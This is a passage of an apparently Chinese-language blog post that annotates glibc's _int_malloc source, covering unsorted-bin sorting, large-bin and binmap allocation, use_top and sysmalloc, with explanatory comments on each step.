class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;<span class="comment">//当满足nb为smallbin范围,且unsorted中只有一个last_remainer时</span></span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);   <span class="comment">//刚好相等</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//放入smallbin</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//放入largebin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))<span class="comment">//小于最小的</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//从大的开始遍历</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;<span class="comment">//永远插在第一个相同大小的后一个位置,不理会nextsize链</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;<span class="comment">//fd_nextsize指向最近的更小的chunk</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//fwd肯定在nextsize链,尾除外</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;<span class="comment">//上一个设置为nextsize链上的</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//largebin为空</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;<span class="comment">//链条完整</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//最多循环10000次</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="循环后largebin分配"><a href="#循环后largebin分配" class="headerlink" title="循环后largebin分配"></a>循环后largebin分配</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<span class="comment">//不为空</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))<span class="comment">//最大的大于需要的才进入</span></span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;<span class="comment">//从小的开始找</span></span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;<span class="comment">//尽量不取出nextsize链上的chunk</span></span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink会设置victim的nextsize链</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//这种情况连多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));<span class="comment">//设置取出部分</span></span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);<span class="comment">//设置remainder</span></span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="binmap情况"><a href="#binmap情况" class="headerlink" title="binmap情况"></a>binmap情况</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">   ++idx;</span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)<span class="comment">//链为空</span></span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;<span class="comment">//链接进入unsorted</span></span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;<span class="comment">//申请大小在smallbin范围,则将剩余部分置为last_remainer</span></span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//nextsize链</span></span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//再触发consolidate</span></span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="堆未初始化"><a href="#堆未初始化" class="headerlink" title="堆未初始化"></a>堆未初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 